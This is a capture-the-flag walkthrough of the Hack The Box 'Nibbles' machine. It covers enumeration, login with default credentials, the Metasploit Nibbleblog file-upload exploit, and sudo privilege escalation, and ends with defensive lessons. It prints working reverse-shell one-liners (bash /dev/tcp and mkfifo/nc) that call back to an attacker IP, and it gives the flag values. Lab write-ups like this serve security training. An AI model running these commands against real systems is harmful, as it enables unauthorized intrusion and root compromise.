# Nibbles - Hack The Box Walkthrough

## Overview

Nibbles is an easy-rated Linux machine from Hack The Box that involves web application enumeration, exploiting a known vulnerability in Nibbleblog CMS, and privilege escalation through misconfigured sudo permissions.

**Target IP:** `10.129.13.133`

## Reconnaissance

### Initial Port Scan

Started with a comprehensive Nmap scan to identify open ports:

```bash
export target=10.129.13.133
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="450" height="60" alt="image" src="https://github.com/user-attachments/assets/c3aaabe3-5f63-492e-8f02-fbf9a20fd7ee" />

<img width="718" height="215" alt="image" src="https://github.com/user-attachments/assets/1e858ce5-f24b-494d-bc04-72ae870f8768" />

**Results:**
- **Port 22**: SSH service
- **Port 80**: HTTP service

### Service Version Detection

Performed detailed service enumeration on discovered ports:

```bash
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="764" height="382" alt="image" src="https://github.com/user-attachments/assets/e1df0e90-7865-4d1c-a49c-05d7aa958c9f" />

**Findings:**
- **Port 22**: OpenSSH service
- **Port 80**: Apache HTTP server

## Enumeration

### Web Application Discovery

Visiting `http://10.129.13.133` revealed a basic webpage. Conducted directory brute-forcing:

<img width="400" height="108" alt="image" src="https://github.com/user-attachments/assets/fd8fd1c6-e7bc-41ac-bd97-a28cc1bad5f7" />

```bash
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 2>/dev/null
```

<img width="959" height="416" alt="image" src="https://github.com/user-attachments/assets/4132156a-abae-422e-bc3e-c25c6c4ea6cd" />

**Discovered:**
- `/nibbleblog/` - Nibbleblog installation directory

### Nibbleblog Enumeration

Further enumeration of the Nibbleblog directory:

```bash
gobuster dir -u http://$target/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 2>/dev/null
```

<img width="959" height="618" alt="image" src="https://github.com/user-attachments/assets/0027b603-b3a2-4371-b3ee-efc6a7592a70" />

**Key Findings:**
- `/admin/` - Admin directory
- `/admin.php` - Admin login page

### Initial Access

1. **Admin Portal Discovery**: Accessed `http://10.129.13.133/nibbleblog/admin.php`
2. **Default Credentials**: Researched and found default credentials `admin:nibbles`

<img width="607" height="515" alt="image" src="https://github.com/user-attachments/assets/fdeea909-029a-4455-b8a0-6657dedea5b7" />

3. **Successful Login**: Gained access to Nibbleblog admin panel
4. **Version Identification**: Navigated to `http://10.129.13.133/nibbleblog/admin.php?controller=settings&action=general` revealing Nibbleblog version 4.0.3

<img width="402" height="137" alt="image" src="https://github.com/user-attachments/assets/ebd10b04-611d-42ca-bdd1-4983dc9221bb" />

### Vulnerability Research

```bash
searchsploit nibbleblog
```

<img width="948" height="179" alt="image" src="https://github.com/user-attachments/assets/d7611508-c64a-407f-a37c-3f934da0bc04" />

**Exploits Found:**
- Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)

## Initial Access

### Metasploit Exploitation

```bash
sudo msfconsole
msf6 > use exploit/multi/http/nibbleblog_file_upload
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.13.133
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
```

<img width="956" height="860" alt="image" src="https://github.com/user-attachments/assets/ed2ca12c-eb67-4981-9af7-7151c5c9dc3c" />

### Establishing Reverse Shell

Upgraded meterpreter shell to a stable reverse shell:

```bash
meterpreter > shell
which bash
/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.106/9005 0>&1"
```

**Listener:**
```bash
nc -nlvp 9005
```

<img width="898" height="643" alt="image" src="https://github.com/user-attachments/assets/78b63781-5f5d-485e-9737-5b6450ff39a3" />

### User Flag

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt
efbe7c0779cc99bbecb4cf4d9b5ecc5a
```

## Privilege Escalation

### Sudo Privilege Analysis

```bash
nibbler@Nibbles:~$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

<img width="745" height="148" alt="image" src="https://github.com/user-attachments/assets/7c89bd01-d987-4085-8963-16790285dfa7" />

### Exploiting Sudo Misconfiguration

1. **Create Directory Structure:**
   ```bash
   mkdir -p /home/nibbler/personal/stuff
   ```

2. **Create Malicious Script:**
   ```bash
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.106 9006 >/tmp/f" > /home/nibbler/personal/stuff/monitor.sh
   ```

3. **Execute with Sudo Privileges:**
   ```bash
   sudo /home/nibbler/personal/stuff/monitor.sh
   ```

<img width="953" height="179" alt="image" src="https://github.com/user-attachments/assets/3d15248b-6e48-481d-b9c1-f3e34c07fa8b" />

**Root Shell Listener:**
```bash
nc -nlvp 9006
```

<img width="592" height="618" alt="image" src="https://github.com/user-attachments/assets/f3391ca0-a5b3-4a02-bafb-b765fc76d98e" />

### Root Flag

```bash
# cat /root/root.txt
2e8261585eea5626b6ca3c9668f95fc9
```

## Lessons Learned

### Security Misconfigurations
1. **Default Credentials**: Nibbleblog installation used default credentials
2. **Outdated Software**: Unpatched Nibbleblog 4.0.3 with known RCE vulnerability
3. **Sudo Misconfiguration**: User allowed to run specific script as root without password

### Attack Vectors
1. **Arbitrary File Upload**: Exploited via Metasploit module
2. **Privilege Escalation**: Abused sudo permissions to execute arbitrary commands

### Defense Recommendations
1. Change default credentials immediately after installation
2. Keep software updated with latest security patches
3. Implement principle of least privilege for sudo configurations
4. Regular security audits and penetration testing

*This walkthrough is for educational purposes only. Always ensure you have proper authorization before conducting security testing.*

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style> 
